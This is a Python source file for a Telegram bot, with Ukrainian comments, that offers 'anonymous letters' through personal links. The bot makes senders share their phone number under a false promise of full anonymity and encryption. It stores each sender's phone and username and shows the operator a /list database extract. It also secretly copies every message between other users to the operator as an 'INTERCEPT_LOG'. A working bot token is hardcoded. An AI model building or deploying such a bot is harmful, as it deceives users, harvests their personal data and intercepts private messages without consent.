import logging
import asyncio
import secrets
from http.server import BaseHTTPRequestHandler, HTTPServer
from threading import Thread
from aiogram import Bot, Dispatcher, F, html
from aiogram.filters import CommandStart, Command
from aiogram.types import (Message, BotCommand, ReplyKeyboardMarkup, 
                           KeyboardButton, ReplyKeyboardRemove, 
                           InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery)
from aiogram.client.default import DefaultBotProperties

# --- НАЛАШТУВАННЯ ---
TOKEN = "8650790713:AAHZrZPELTHP3Q507ZoE__-yKLI3FqBWkMg"
MY_ID = 5011423015 

# --- СЕРВЕР ДЛЯ RENDER (Щоб бот не вимикався) ---
class HealthCheckHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"DARK BOT STATUS: ACTIVE")

def run_health_check():
    # Render шукає активність на порту 10000
    server = HTTPServer(('0.0.0.0', 10000), HealthCheckHandler)
    server.serve_forever()

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

# Сховища (пам'ятай: при перезавантаженні на Render вони очистяться)
user_connections = {}  
user_keys = {}         
user_phones = {}       
stats = {"total_msg": 0, "users": set()}

async def set_menus(bot: Bot):
    base = [BotCommand(command="start", description="🔗 Моє посилання"), BotCommand(command="reset", description="🔄 Сменити посилання")]
    await bot.set_my_commands(base)
    await bot.set_my_commands(base + [
        BotCommand(command="stats", description="📊 Статистика"),
        BotCommand(command="list", description="👤 База"),
        BotCommand(command="reply", description="✉️ Відповідь адміна")
    ], scope={"type": "chat", "chat_id": MY_ID})

def get_link(u_id):
    if u_id not in user_keys:
        user_keys[u_id] = secrets.token_hex(4)
    return f"https://t.me/anonymousOletters_bot?start={user_keys[u_id]}"

@dp.message(CommandStart())
async def cmd_start(message: Message):
    args = message.text.split()
    u_id = message.from_user.id
    stats["users"].add(u_id)

    if len(args) > 1:
        target_key = args[1]
        target_id = None
        for uid, key in user_keys.items():
            if key == target_key: target_id = uid; break
        
        if target_id:
            if target_id == u_id: return await message.answer("◾️ <i>Не можна писати самому собі.</i>")
            user_connections[u_id] = target_id
            if target_id == MY_ID: await bot.send_message(MY_ID, f"🌑 <b>LOG:</b> Посилання відкрив <code>{u_id}</code>")

            if u_id in user_phones or u_id == MY_ID:
                return await message.answer("🏴 <b>DARK CHAT ACTIVE</b>\nНапишіть ваше повідомлення:", reply_markup=ReplyKeyboardRemove())

            kb = ReplyKeyboardMarkup(keyboard=[[KeyboardButton(text="⬛️ ПІДТВЕРДИТИ ОСОБУ", request_contact=True)]], resize_keyboard=True, one_time_keyboard=True)
            return await message.answer(
                "🎬 <b>PROTOCOL: VERIFICATION</b>\n\n"
                "Системі потрібне підтвердження особи для виключення спам-ботів.\n\n"
                "▪️ <b>PRIVACY POLICY:</b>\n"
                "<code>Бот гарантує 100% анонімність. Дані зашифровані.</code>", 
                reply_markup=kb
            )
        else:
            return await message.answer("◾️ <b>ERROR:</b> <i>Посилання деактивоване.</i>")

    await message.answer(f"🏴 <b>ВАШЕ ПОСИЛАННЯ:</b>\n<code>{get_link(u_id)}</code>", reply_markup=ReplyKeyboardRemove())

@dp.callback_query(F.data.startswith("ans_"))
async def process_reply_btn(callback: CallbackQuery):
    target_id = int(callback.data.split("_")[1])
    user_connections[callback.from_user.id] = target_id
    await callback.message.answer("⌨️ <b>ENTER RESPONSE:</b>\nВідправте повідомлення для анонімної відповіді...")
    await callback.answer()

@dp.message(Command("reset"))
async def cmd_reset(message: Message):
    u_id = message.from_user.id
    user_keys[u_id] = secrets.token_hex(4)
    await message.answer(f"🔄 <b>NEW LINK GENERATED:</b>\n<code>{get_link(u_id)}</code>")

@dp.message(Command("list"))
async def cmd_list(message: Message):
    if message.from_user.id != MY_ID: return
    if not user_phones: return await message.answer("◾️ База даних порожня.")
    text = "📂 <b>DATABASE_EXTRACT:</b>\n\n"
    for i, (uid, data) in enumerate(user_phones.items(), 1):
        un = f"@{data['username']}" if data['username'] else "---"
        text += f"▪️ {un} | <code>{data['phone']}</code> | <code>{uid}</code>\n"
    await message.answer(text)

@dp.message(Command("stats"))
async def cmd_stats(message: Message):
    if message.from_user.id != MY_ID: return
    await message.answer(f"📊 <b>STATS:</b>\n\nUsers: {len(stats['users'])}\nMessages: {stats['total_msg']}")

@dp.message(F.contact)
async def handle_contact(message: Message):
    u_id = message.from_user.id
    user_phones[u_id] = {"phone": message.contact.phone_number, "username": message.from_user.username, "name": html.quote(message.from_user.full_name)}
    await message.answer("◾️ <b>ACCESS GRANTED.</b> Пишіть повідомлення:", reply_markup=ReplyKeyboardRemove())

@dp.message()
async def handle_all_messages(message: Message):
    u_id = message.from_user.id
    if message.text and message.text.startswith("/"): return

    if u_id in user_connections:
        if u_id not in user_phones and u_id != MY_ID:
            return await message.answer("◾️ <b>LOCKED:</b> Потрібна верифікація.")

        target = user_connections.pop(u_id)
        stats["total_msg"] += 1
        u_data = user_phones.get(u_id, {"phone": "ROOT", "name": "ADMIN"})
        
        try:
            reply_kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⌨️ ВІДПОВІСТИ", callback_data=f"ans_{u_id}")]])

            if target != MY_ID:
                if message.text:
                    design_msg = (
                        f"🌑 <b>NEW INCOMING MESSAGE</b>\n"
                        f"————————————————\n"
                        f"<code>{html.quote(message.text)}</code>\n"
                        f"————————————————"
                    )
                    await bot.send_message(target, design_msg, reply_markup=reply_kb)
                else:
                    await bot.copy_message(target, message.chat.id, message.message_id, reply_markup=reply_kb)
            
            await message.answer("◾️ <b>SENT_SUCCESSFULLY</b>")

            if u_id != MY_ID:
                is_to_me = (target == MY_ID)
                header = "📥 <b>DIRECT_MESSAGE</b>" if is_to_me else "🛰 <b>INTERCEPT_LOG</b>"
                report = (f"{header}\n▪️ FROM: <code>{u_data['phone']}</code>\n▪️ ID: <code>{u_id}</code>")
                
                if message.text:
                    if is_to_me:
                        report += f"\n————————————————\n<code>{html.quote(message.text)}</code>"
                        await bot.send_message(MY_ID, report, reply_markup=reply_kb)
                    else:
                        await bot.send_message(MY_ID, report)
                        await bot.send_message(MY_ID, f"📎 <b>CONTENT_COPY:</b>\n<code>{html.quote(message.text)}</code>")
                else:
                    await bot.send_message(MY_ID, report)
                    await bot.copy_message(MY_ID, message.chat.id, message.message_id)
        except: await message.answer("◾️ <b>DELIVERY_FAILED</b>")
    else:
        await message.answer("◾️ <b>ERROR:</b> Використовуйте пряме посилання.")

async def main():
    # Запуск фонового сервера для Render
    Thread(target=run_health_check, daemon=True).start()
    
    await set_menus(bot)
    await bot.delete_webhook(drop_pending_updates=True)
    print("DARK BOT v13.5 STARTED ON RENDER.")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
    
